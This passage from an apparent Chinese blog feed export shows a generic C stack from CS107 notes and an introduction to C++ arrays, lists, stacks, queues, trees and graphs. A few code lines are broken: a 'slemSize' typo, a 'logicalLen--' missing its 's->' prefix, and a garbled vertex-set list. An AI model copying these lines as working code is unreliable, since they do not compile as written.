class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>logicalLen <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    logicalLen<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">[</span>s<span class=\"token operator\">-></span>logicalLen<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"实现上述类型的通用模板\"><a class=\"markdownIt-Anchor\" href=\"#实现上述类型的通用模板\">#</a> 实现上述类型的通用模板</h2>\n<h3 id=\"stackh\"><a class=\"markdownIt-Anchor\" href=\"#stackh\">#</a> stack.h</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 泛型中并不知道类型占用字节的大小，所以需要指定</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> loglength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"stackc\"><a class=\"markdownIt-Anchor\" href=\"#stackc\">#</a> stack.c</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>elemSize <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>elemSize <span class=\"token operator\">=</span> elemSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span>elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">==</span> s<span class=\"token operator\">-></span>alloclength<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token function\">StackGrow</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 这里添加了一个辅助函数用于进行内存空间拓展</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>target <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">+</span> s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">*</span>s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span>elemAddr<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token operator\">-></span>loglength<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当 <code>static</code>  修饰 c 或者 c<ins> 的函数原型时，这意味着，这是一个私有函数，不应该在函数所在文件之外的地方对其引用，因此在大多数情况下，它和 C</ins> 中的 private 有着相同的含义。其他的函数诸如我们上面写的 New、Disopose、Push 等都是全局函数，可以被其他的 <code>.o</code>  文件所使用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">StackGrow</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">realloc</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*</span> s<span class=\"token operator\">-></span>slemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>source <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>loglength <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>elemAddr<span class=\"token punctuation\">,</span>source<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>loglength<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/C++%20%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/",
            "url": "http://yanagi-kon.github.io/2023/11/05/C++%20%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/",
            "title": "C++ 常见的数据结构",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"c-常见的数据结构\"><a class=\"markdownIt-Anchor\" href=\"#c-常见的数据结构\">#</a> C++ 常见的数据结构</h1>\n<h2 id=\"数组\"><a class=\"markdownIt-Anchor\" href=\"#数组\">#</a> 数组</h2>\n<p>数组是将相同类型的元素存储于连续内存空间的数据结构，其长度不可变。</p>\n<p>如下图所示，构建此数组需要在初始化时给定长度，并对数组每个索引元素赋值，代码如下：</p>\n<pre><code class=\"language-c++\">// 初始化一个长度为 5 的数组 array\nint array[5];\n// 元素赋值\narray[0] = 2;\narray[1] = 3;\narray[2] = 1;\narray[3] = 0;\narray[4] = 2;\n</code></pre>\n<p>或者可以使用直接赋值的初始化方式，代码如下：</p>\n<pre><code class=\"language-c++\">int array[] = &#123;2, 3, 1, 0, 2&#125;;\n</code></pre>\n<p>「可变数组」是经常使用的数据结构，其基于数组和扩容机制实现，相比普通数组更加灵活。常用操作有：访问元素、添加元素、删除元素。</p>\n<pre><code class=\"language-c++\">// 初始化可变数组\nvector&lt;int&gt; array;\n\n// 向尾部添加元素\narray.push_back(2);\narray.push_back(3);\narray.push_back(1);\narray.push_back(0);\narray.push_back(2);\n</code></pre>\n<h2 id=\"链表\"><a class=\"markdownIt-Anchor\" href=\"#链表\">#</a> 链表</h2>\n<p>链表以节点为单位，每个元素都是一个独立对象，在内存空间的存储是非连续的。链表的节点对象具有两个成员变量：「值  <code>val</code> 」，「后继节点引用  <code>next</code> 」 。</p>\n<pre><code class=\"language-c++\">struct ListNode &#123;\n    int val;        // 节点值\n    ListNode *next; // 后继节点引用\n    ListNode(int x) : val(x), next(NULL) &#123;&#125;\n&#125;;\n</code></pre>\n<p>如下图所示，建立此链表需要实例化每个节点，并构建各节点的引用指向。</p>\n<pre><code class=\"language-c++\">// 实例化节点\nListNode *n1 = new ListNode(4); // 节点 head\nListNode *n2 = new ListNode(5);\nListNode *n3 = new ListNode(1);\n\n// 构建引用指向\nn1-&gt;next = n2;\nn2-&gt;next = n3;\n</code></pre>\n<h2 id=\"栈\"><a class=\"markdownIt-Anchor\" href=\"#栈\">#</a> 栈</h2>\n<p>栈是一种具有 「先入后出」 特点的抽象数据结构，可使用数组或链表实现。</p>\n<pre><code class=\"language-c++\">stack&lt;int&gt; stk;\n</code></pre>\n<p>如下图所示，通过常用操作「入栈  <code>push()</code> 」,「出栈  <code>pop()</code> 」，展示了栈的先入后出特性。</p>\n<pre><code class=\"language-c++\">stk.push(1); // 元素 1 入栈\nstk.push(2); // 元素 2 入栈\nstk.pop();   // 出栈 -&gt; 元素 2\nstk.pop();   // 出栈 -&gt; 元素 1\n</code></pre>\n<h2 id=\"队列\"><a class=\"markdownIt-Anchor\" href=\"#队列\">#</a> 队列</h2>\n<p>队列是一种具有 「先入先出」 特点的抽象数据结构，可使用链表实现。</p>\n<pre><code class=\"language-c++\">queue&lt;int&gt; que;\n</code></pre>\n<p>如下图所示，通过常用操作「入队  <code>push()</code> 」,「出队  <code>pop()</code> 」，展示了队列的先入先出特性。</p>\n<pre><code class=\"language-c++\">que.push(1); // 元素 1 入队\nque.push(2); // 元素 2 入队\nque.pop();   // 出队 -&gt; 元素 1\nque.pop();   // 出队 -&gt; 元素 2\n</code></pre>\n<h2 id=\"树\"><a class=\"markdownIt-Anchor\" href=\"#树\">#</a> 树</h2>\n<p>树是一种非线性数据结构，根据子节点数量可分为 「二叉树」 和 「多叉树」，最顶层的节点称为「根节点 root」。以二叉树为例，每个节点包含三个成员变量：「值 val」、「左子节点 left」、「右子节点 right」 。</p>\n<pre><code class=\"language-c++\">struct TreeNode &#123;\n    int val;         // 节点值\n    TreeNode *left;  // 左子节点\n    TreeNode *right; // 右子节点\n    TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;\n&#125;;\n</code></pre>\n<p>如下图所示，建立此二叉树需要实例化每个节点，并构建各节点的引用指向。</p>\n<pre><code class=\"language-c++\">// 初始化节点\nTreeNode *n1 = new TreeNode(3); // 根节点 root\nTreeNode *n2 = new TreeNode(4);\nTreeNode *n3 = new TreeNode(5);\nTreeNode *n4 = new TreeNode(1);\nTreeNode *n5 = new TreeNode(2);\n\n// 构建引用指向\nn1-&gt;left = n2;\nn1-&gt;right = n3;\nn2-&gt;left = n4;\nn2-&gt;right = n5;\n</code></pre>\n<h2 id=\"图\"><a class=\"markdownIt-Anchor\" href=\"#图\">#</a> 图</h2>\n<p>图是一种非线性数据结构，由「节点（顶点）vertex」和「边 edge」组成，每条边连接一对顶点。根据边的方向有无，图可分为「有向图」和「无向图」。本文 以无向图为例 开展介绍。</p>\n<p>如下图所示，此无向图的 顶点 和 边 集合分别为：</p>\n<ul>\n<li 5 1, 2, 3, 4,>\n<p>顶点集合： vertices =</p>\n</li>\n<li>\n<p>边集合： edges = {(1, 2), (1, 3), (1, 4), (1, 5), (2, 4), (3, 5), (4, 5)</p>\n</li>\n</ul>\n<p><img data-src=\"1599579136-Fxseew-Picture7.png\" alt=\"Picture7.png\"></p>\n<p>表示图的方法通常有两种：</p>\n<ol>\n<li>\n<p><strong>邻接矩阵：</strong> 使用数组  <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">vertices</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储顶点，邻接矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">edges</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储边；<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">[</mo><mi>j</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">edges[i][j]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">]</span></span></span></span> 代表节点 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[i+1]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">]</span></span></span></span> 和节点 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mi>j</mi><mo>+</mo><mn>1</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[j+1]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">]</span></span></span></span>  之间是否有边。</p>\n<pre><code class=\"language-c++\">int vertices[5] = &#123;1, 2, 3, 4, 5&#125;;\nint edges[5][5] = &#123;&#123;0, 1, 1, 1, 1&#125;,\n                      &#123;1, 0, 0, 1, 0&#125;,\n                      &#123;1, 0, 0, 0, 1&#125;,\n                      &#123;1, 1, 0, 0, 1&#125;,\n                      &#123;1, 0, 1, 1, 0&#125;&#125;;\n</code></pre>\n</li>\n<li>\n<p><strong>邻接表：</strong> 使用数组 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">vertices</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储顶点，邻接表 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">edges</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 存储边。<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">edges</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span></span></span></span> 为一个二维容器，第一维 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 代表顶点索引，第二维 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">edges[i]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span></span></span></span> 存储此顶点对应的边集和；例如 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>e</mi><mi>d</mi><mi>g</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mn>0</mn><mo stretchy=\"false\">]</mo><mo>=</mo><mo stretchy=\"false\">[</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>4</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">edges[0] = [1,2,3,4]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord\">0</span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">4</span><span class=\"mclose\">]</span></span></span></span> 代表 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>c</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mn>0</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">vertices[0]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord\">0</span><span class=\"mclose\">]</span></span></span></span> 的边集合为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>4</mn><mo stretchy=\"false\">]</mo><mtext>。</mtext></mrow><annotation encoding=\"application/x-tex\">[1,2,3,4]。</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">4</span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">。</span></span></span></span></p>\n<pre><code class=\"language-c++\">int vertices[5] = &#123;1, 2, 3, 4, 5&#125;;\nvector&lt;vector&lt;int&gt;&gt; edges;\n\nvector&lt;int&gt; edge_1 = &#123;1, 2, 3, 4&#125;;\nvector&lt;int&gt; edge_2 = &#123;0, 3&#125;;\nvector&lt;int&gt; edge_3 = &#123;0, 4&#125;;\nvector&lt;int&gt; edge_4 = &#123;0, 1, 4&#125;;\nvector&lt;int&gt; edge_5 = &#123;0, 2, 3&#125;;\nedges.push_back(edge_1);\nedges.push_back(edge_2);\nedges.push_back(edge_3);\nedges.push_back(edge_4);\nedges.push_back(edge_5);\n</code></pre>\n</li>\n</ol>\n<blockquote>\n<p><strong>邻接矩阵 VS 邻接表 ：</strong></p>\n<p>邻接矩阵的大小只与节点数量有关，即 <span class=\"katex\"><span class=\"katex-mathml\"><math 